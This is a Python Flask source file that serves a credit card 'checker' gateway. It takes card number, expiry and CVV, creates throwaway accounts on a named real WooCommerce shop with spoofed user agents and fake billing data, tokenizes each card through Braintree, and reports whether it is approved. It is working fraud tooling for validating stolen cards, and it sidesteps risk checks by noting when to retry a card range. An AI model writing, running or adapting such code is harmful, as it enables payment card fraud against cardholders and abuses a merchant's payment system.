from flask import Flask, request, jsonify
import user_agent
import requests
import re
import base64
import random
import string
from bs4 import BeautifulSoup

app = Flask(__name__)

def generate_response(result):
    try:
        response = "Unknown"
        status = "Declined"
        
        if 'Payment method successfully added.' in result or \
           'Nice! New payment method added' in result or \
           'Duplicate card exists in the vault.' in result or \
           'Status code avs: Gateway Rejected: avs' in result or \
           'Status code cvv: Gateway Rejected:' in result:
            response = "Approved ✅"
            status = "Approved"
        elif 'Status code risk_threshold: Gateway Rejected: risk_threshold' in result:
            response = "Risk: Retry This Bin Later ❌"
        else:
            soup = BeautifulSoup(result, 'html.parser')
            error_elements = soup.find_all('ul', class_='woocommerce-error')
            for error_element in error_elements:
                for li in error_element.find_all('li'):
                    if 'Status code' in li.text:
                        response = li.text.strip() + ' ❌'
        
        return response, status
    except Exception as e:
        return f"Error processing response: {str(e)}", "Error"

def generate_email():
    return ''.join(random.choices(string.ascii_lowercase, k=10)) + "@gmail.com"

def generate_username():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=15))

def generate_code(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def check_cc(cc):
    try:
        cc, mes, ano, cvv = cc.strip().split('|')
        if "20" not in ano:
            ano = f"20{ano}"
        
        acc = generate_email()
        username = generate_username()
        corr = generate_code()

        headers = {'user-agent': user_agent.generate_user_agent()}
        session = requests.Session()

        # Register account
        r = session.get('https://www.bebebrands.com/my-account/', headers=headers)
        reg = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', r.text).group(1)

        session.post('https://www.bebebrands.com/my-account/', headers=headers, data={
            'username': username, 'email': acc, 'password': 'SandeshThePapa@',
            'woocommerce-register-nonce': reg, '_wp_http_referer': '/my-account/', 'register': 'Register'
        })

        # Set billing address
        r = session.get('https://www.bebebrands.com/my-account/edit-address/billing/', headers=headers)
        address_nonce = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', r.text).group(1)

        session.post('https://www.bebebrands.com/my-account/edit-address/billing/', headers=headers, data={
            'billing_first_name': 'Ayush', 'billing_last_name': 'kumar', 'billing_country': 'GB',
            'billing_address_1': '43 Moore forks', 'billing_city': 'Sarahchester', 'billing_postcode': 'N8 6SG',
            'billing_phone': '+44292018381', 'billing_email': acc, 'save_address': 'Save address',
            'woocommerce-edit-address-nonce': address_nonce,
            '_wp_http_referer': '/my-account/edit-address/billing/', 'action': 'edit_address'
        })

        # Get payment method nonce
        r = session.get('https://www.bebebrands.com/my-account/add-payment-method/', headers=headers)
        add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', r.text).group(1)
        client_nonce = re.search(r'client_token_nonce":"([^"]+)"', r.text).group(1)

        token_resp = session.post('https://www.bebebrands.com/wp-admin/admin-ajax.php', headers=headers, data={
            'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_nonce
        })
        enc = token_resp.json()['data']
        dec = base64.b64decode(enc).decode('utf-8')
        au = re.search(r'"authorizationFingerprint":"(.*?)"', dec).group(1)

        # Tokenize credit card
        tokenize_headers = {
            'authorization': f'Bearer {au}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'user-agent': user_agent.generate_user_agent(),
        }

        json_data = {
            'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': generate_code(36)},
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc, 'expirationMonth': mes,
                        'expirationYear': ano, 'cvv': cvv,
                    },
                    'options': {'validate': False}
                }
            },
            'operationName': 'TokenizeCreditCard',
        }

        r = requests.post('https://payments.braintree-api.com/graphql',
                         headers=tokenize_headers, json=json_data)
        tok = r.json()['data']['tokenizeCreditCard']['token']
        
        # Submit payment
        headers = {
            'authority': 'www.bebebrands.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.bebebrands.com',
            'referer': 'https://www.bebebrands.com/my-account/add-payment-method/',
            'user-agent': user_agent.generate_user_agent(),
        }

        data = {
            'payment_method': 'braintree_credit_card',
            'wc-braintree-credit-card-card-type': 'master-card',
            'wc-braintree-credit-card-3d-secure-enabled': '',
            'wc-braintree-credit-card-3d-secure-verified': '',
            'wc-braintree-credit-card-3d-secure-order-total': '0.00',
            'wc_braintree_credit_card_payment_nonce': tok,
            'wc_braintree_device_data': '{"correlation_id":"ca769b8abef6d39b5073a87024953791"}',
            'wc-braintree-credit-card-tokenize-payment-method': 'true',
            'woocommerce-add-payment-method-nonce': add_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }

        response = session.post('https://www.bebebrands.com/my-account/add-payment-method/', 
                              headers=headers, data=data).text
        
        return generate_response(response)
    except Exception as e:
        return f"Error: {str(e)}", "Error"

@app.route('/gate=b3/key=wasdarkboy/cc=<cc_details>')
def process_cc(cc_details):
    response, status = check_cc(cc_details)
    return jsonify({
        "cc": cc_details,
        "response": response,
        "status": status
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3334)
